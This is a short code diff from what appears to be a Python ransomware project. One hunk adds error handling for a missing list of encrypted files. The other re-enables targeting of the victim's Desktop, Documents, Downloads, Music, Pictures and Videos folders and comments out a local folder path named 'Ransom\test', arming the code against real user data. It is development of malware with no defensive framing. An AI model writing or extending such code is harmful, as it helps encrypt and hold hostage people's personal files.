@@ -43,9 +43,12 @@ class main():
     # Function to decrypt the provided files
 
     # Get list of encrypted files
-    with open(self.encrypted_file_list) as fh:
-      file_list = fh.readlines()
-    fh.close()
+    try:
+      with open(self.encrypted_file_list) as fh:
+        file_list = fh.readlines()
+      fh.close()
+    except IOError:
+      raise Exception("A list of encrypted files was not found at: %s" % self.encrypted_file_list)
 
     # Decrypt!
     for x in file_list:
@@ -104,15 +107,15 @@ class main():
     home_dir = os.environ['USERPROFILE']
 
     # Create base_dirs list
-    #base_dirs = [ os.path.join(home_dir, "Desktop"),
-    #              os.path.join(home_dir, "Documents"),
-    #              os.path.join(home_dir, "Downloads"),
-    #              os.path.join(home_dir, "Music"),
-    #              os.path.join(home_dir, "Pictures"),
-    #              os.path.join(home_dir, "Videos")
-    #              ]
+    base_dirs = [ os.path.join(home_dir, "Desktop"),
+                  os.path.join(home_dir, "Documents"),
+                  os.path.join(home_dir, "Downloads"),
+                  os.path.join(home_dir, "Music"),
+                  os.path.join(home_dir, "Pictures"),
+                  os.path.join(home_dir, "Videos")
+                  ]
 
-    base_dirs = [ "C:\\Users\\Sithis\\development\\Ransom\\test" ]
+    #base_dirs = [ "C:\\Users\\Sithis\\development\\Ransom\\test" ]
 
     return base_dirs
 
